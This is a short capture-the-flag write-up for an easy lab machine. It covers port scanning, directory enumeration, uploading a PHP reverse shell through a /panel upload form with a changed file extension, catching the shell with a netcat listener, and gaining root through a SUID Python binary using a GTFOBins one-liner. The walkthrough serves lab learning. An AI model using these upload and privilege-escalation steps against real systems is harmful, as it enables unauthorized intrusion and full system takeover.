- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

Just root the machine .

# Recon
## Nmap

We can use [[Nmap]] to scan the machine IP :

```
    80/tcp open http  
    22/tcp open ssh
```
# Enumeration 
## Gobuster

We can use [[Gobuster]] to enumerate directories :

```
    /panel
```

# Exploit
## Reverse shell

We can download the reverse shell from here https://github.com/pentestmonkey/php-reverse-shell

notice that we have to modify the [[IP address]] in the code and target our [[Vulnerable Machine]] :


<img src="../../Flameshots/c11a62a3346b0561b978ba29613dd5e2.png" alt="c11a62a3346b0561b978ba29613dd5e2.png" width="261" height="153" class="jop-noMdConv">

## Obtaining first access

visiting /panel we can upload the [[3 - Tags/Hacking Concepts/Reverse Shell]], after a few tries modifing the .php extension to fit the php version supported (**php5**)

but first we have to setup a listener on the $port you have in the shell code , i didn't change the code and execute [[Netcat]] like this

         `nc -lvnp 1234`

after that we can upload our Shell on /panel and wait for the connection, then `find / -type f -name user.txt 2> /dev/null` to find the user.txt file containing the first [[Flag]] .

# Privilege Escalation

For [[Privilege Escalation]] we can find SUID permissions for the user `$ find / -user root -perm /4000`  and find `/usr/bin/python`

we can go to  https://gtfobins.github.io/  and get a [[Python]] [[GTFO]]

then on the Target Machine we execute  `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`  (the command for escalation)

confirm with `whoami` >> `root` and find the flag `find / -type f -name root.txt`  >>  `cat root.txt`

Rooted !!